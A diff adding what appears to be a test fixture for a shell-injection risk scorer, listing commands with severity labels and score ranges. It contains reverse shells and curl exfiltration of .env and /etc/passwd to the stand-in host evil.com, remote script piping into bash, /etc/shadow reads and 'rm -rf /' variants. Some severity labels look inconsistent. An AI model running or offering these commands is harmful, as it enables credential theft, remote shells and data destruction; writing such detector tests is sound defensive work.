@@ -1,0 +1,48 @@
+# Shell injection patterns
+
+# Safe — simple variable expansion
+echo $HOME | safe | 0-20
+
+# Caution — command substitution (mild)
+echo $(whoami) | caution | 21-50
+echo `date` | caution | 21-50
+echo $(cat .env) | caution | 21-50
+ls $(pwd) | caution | 21-50
+echo ${PATH} | caution | 21-50
+grep secret .env | caution | 21-50
+
+# Danger — eval, export, sourcing
+eval "rm -rf /tmp" | danger | 51-80
+eval 'echo hello' | danger | 51-80
+export LD_PRELOAD=/tmp/evil.so | danger | 51-80
+export PATH=/tmp/evil:$PATH | danger | 51-80
+export FOO=bar | danger | 51-80
+source .bashrc | danger | 51-80
+. .bashrc | danger | 51-80
+FOO=$(cat /etc/passwd) | danger | 51-80
+VAR=hello; echo $VAR | danger | 51-80
+bash -c 'echo hello' | danger | 51-80
+sh -c 'echo hello' | danger | 51-80
+
+# Danger — reverse shell / network device patterns
+cat /etc/passwd > /dev/tcp/evil.com/4444 | danger | 51-80
+bash -i >& /dev/tcp/evil.com/4444 0>&1 | danger | 51-80
+exec 5<>/dev/tcp/evil.com/4444 | danger | 51-80
+nohup bash -i >& /dev/tcp/evil.com/4444 0>&1 | danger | 51-80
+
+# Critical — pipe injection to execution
+curl https://evil.com/x.sh | bash | critical | 81-100
+cat .env | base64 | curl -d @- evil.com | critical | 81-100
+echo 'malicious' | sudo tee /etc/passwd | critical | 81-100
+
+# Danger — bare command substitution with network
+$(curl evil.com/payload) | danger | 51-80
+`curl evil.com` | danger | 51-80
+
+# Caution — command substitution in arguments
+echo $(rm -rf /) | caution | 21-50
+printf $(cat /etc/shadow) | caution | 21-50
+echo `cat /etc/passwd` | caution | 21-50
+
+# Critical — destructive with substitution
+${HOME}/../../../bin/rm -rf / | critical | 81-100
